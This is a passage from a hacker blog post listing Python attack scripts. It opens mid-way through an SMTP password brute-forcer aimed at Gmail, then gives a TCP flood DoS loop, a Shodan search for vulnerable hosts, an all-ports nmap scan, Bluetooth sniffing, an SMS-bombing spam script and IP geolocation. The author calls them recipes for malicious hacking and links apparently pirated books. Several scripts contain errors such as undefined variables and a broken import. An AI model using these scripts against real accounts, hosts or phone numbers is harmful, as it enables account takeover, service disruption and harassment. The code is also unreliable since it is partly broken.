          s.ehlo
          s.login(username, str(password))
          print &quot;Found! Password: %s&quot; % password
          s.close
        except:
          print &quot;OOPs something went wrong&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Let’s look at a few lines. the &lt;code class=&quot;highlighter-rouge&quot;&gt;for&lt;/code&gt; keyword takes each newline within the &lt;code class=&quot;highlighter-rouge&quot;&gt;wordlist.txt&lt;/code&gt; and appends it as a possible password. When we look at line 8, a SMTP object is defined, connecting to the Gmail SMTP server on port 587. The SMTP object would attempt to login using with the username, and each password from within the wordlist.&lt;/p&gt;

&lt;h2 id=&quot;3-tcp-dos-attack&quot;&gt;3. TCP DoS attack&lt;/h2&gt;
&lt;p&gt;This quick script provides a way for the user to employ a quick stress.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from scapy import *
target = &quot;127.0.0.1&quot; # replace with target IP address
port = 80
sport = 8080 # replace with source port, or import random to randomize.
while True:
  send(IP(dst=target) / TCP(sport=x,dport=port), inter=.005)
  print &quot;Sent. Kill with Ctrl + C&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We look at line 6. This implements the module &lt;code class=&quot;highlighter-rouge&quot;&gt;scapy&lt;/code&gt;. Three variables are utilized, a target address, port,
and source port. The send() method identifies that, as well as using the TCP protocol.&lt;/p&gt;

&lt;h2 id=&quot;4-searching-vulnerability-with-shodan&quot;&gt;4. Searching Vulnerability with Shodan&lt;/h2&gt;
&lt;p&gt;This script implements the &lt;code class=&quot;highlighter-rouge&quot;&gt;shodan&lt;/code&gt; API in order to find vulnerable devices/services.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import shodan
SHODAN_API_KEY = # key here
# Create object
api = shodan.Shodan(SHODAN_API_KEY)
try:
    results = api.search(&quot;&quot;) # string to search
    print &quot;Result: %s&quot; % results[total]
    for result in results['matches']:
        print &quot;IP: %s&quot; % result['ip_str']
        print result['data']
except shodan.APIError, e:
    print &quot;Something went wrong&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;5-scanning-with-nmap&quot;&gt;5. Scanning with Nmap&lt;/h2&gt;
&lt;p&gt;Very simple host scan using the &lt;code class=&quot;highlighter-rouge&quot;&gt;python-nmap&lt;/code&gt; module.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import python-nmap
ip = '127.0.0.1' # replace with target host
scan = nmap.PortScanner()
scan.scan(ip, '0-65535') # scan host, all ports
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;6-sniffing-bluetooth-devices&quot;&gt;6. Sniffing Bluetooth Devices&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from bluetooth import *
from time import *
found = []
def findDevices():
    foundDevs = discover_devices(lookup_names = True)
    for (addr. name) in foundDevs:
        if addr not in alreadyFound:
            print &quot;Found Device &quot; + str(name)
            print &quot;MAC Address: &quot; + str(addr)
            found.append(addr)
while True:
    findDevices()
    sleep(5)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;7-sms-bomb&quot;&gt;7. SMS Bomb&lt;/h2&gt;
&lt;p&gt;This script uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtplib&lt;/code&gt;, just as the SMTP cracker does. However,
this time it is implemented on email-2-text carrier address.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import smtplib
# It is important to use a disposable Gmail account
gmail = &quot;test@gmail&quot;
password = &quot;somepassword&quot;
target_num = &quot;123-456-7890@vtext.com&quot;
# Example Verizon SMS address. Replace with carrier address of num.
o = smtplib.SMTP(&quot;smtp.gmail.com:587&quot;)
o.starttls()
o.login(gmail, password)
message = &quot;Something hi&quot;
spam_msg = &quot;From: {} \r\nTo: {} \r\n\r\n {}&quot;.format(gmail, phone_num, message)
counter = 20 # execute 20 times
for i in range(counter):
      o.sendmail(gmail, phone_num, spam_msg)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;8-geolocation&quot;&gt;8. Geolocation&lt;/h2&gt;
&lt;p&gt;Take an IP address, and you get back some nice juicy information about geolocation.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pygeoip
# GeoIP object
gi = pygeoip.GeoIP('GeoIP.dat') # specify database file for GeoIP.
gi = pygeoip.GeoIP('GeoIPRegion.dat') # region
gi = pygeoip.GeoIP('GeoIPCity.dat') # city
gi = pygeoip.GeoIP('GeoIPISP.dat') # ISP
ip = &quot;127.0.0.1&quot; # replace with IP address!
# Country
gi.country_name_by_addr(ip) #=&amp;gt; &quot;United States&quot; for e.g
gi.region_by_addr(ip) #=&amp;gt; {'region_name': 'NY', 'country_code': 'US'}
gi.record_by_addr(ip) #=&amp;gt; Returns a huge dict of stuff Im not even gonna give an example
gi.org_by_addr(ip) #=&amp;gt; &quot;Super Techcom ISP Inc. Corp.&quot;
# More info: https://github.com/appliedsec/pygeoip/wiki
# Even more info: http://pygeoip.readthedocs.io/en/v0.3.2/getting-started.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;That’s just some of my favorite quick delicious recipes for evil malicious Pythonic hax3z.&lt;/p&gt;

&lt;p&gt;As a language that includes elements of a &lt;strong&gt;procedural scripting&lt;/strong&gt; language and &lt;strong&gt;object-oriented&lt;/strong&gt; language, Python provides at-ease use for both hackers and engineers. I rely greatly on Python when it comes to writing scripts and projects, and hopefully, I’ll continue to utilize it. However, to add some variation, I’ll start with some projects in C, Rust and Ruby as well. Exploitation is looking nice, so that’s something I’m aiming at.&lt;/p&gt;

&lt;p&gt;Thanks for reading, and more is coming! Here is a gr8 list of books by hackers for hackers with relevance to Python:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://file.allitebooks.com/20150521/Black%20Hat%20Python.pdf&quot;&gt;&lt;strong&gt;Black Hat Python&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.chinastor.org/upload/2015-08/15081917086229.pdf&quot;&gt;&lt;strong&gt;Gray Hat Python&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://repo.zenk-security.com/Programmation/Violent%20Python%20a%20Cookbook%20for%20Hackers-Forensic%20Analysts-Penetration%20testers%20and%20Security%20Engineers.pdf&quot;&gt;&lt;strong&gt;Violent Python&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;and of course, if you are a beginner YEARNING to learn, here’s a great classic:
 &lt;a href=&quot;https://automatetheboringstuff.com/&quot;&gt;&lt;strong&gt;Automate the Boring Stuff with Python&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Alan</name></author><summary type="html">Python is one of the greatest programming languages for hackers. Not because of its easiness actually, but it is beginner-friendly and fast to deploy. One of the best thing about the language is the resemblance to that of a natural language, sharing syntactical and semantical rules that very much look like English.</summary></entry></feed>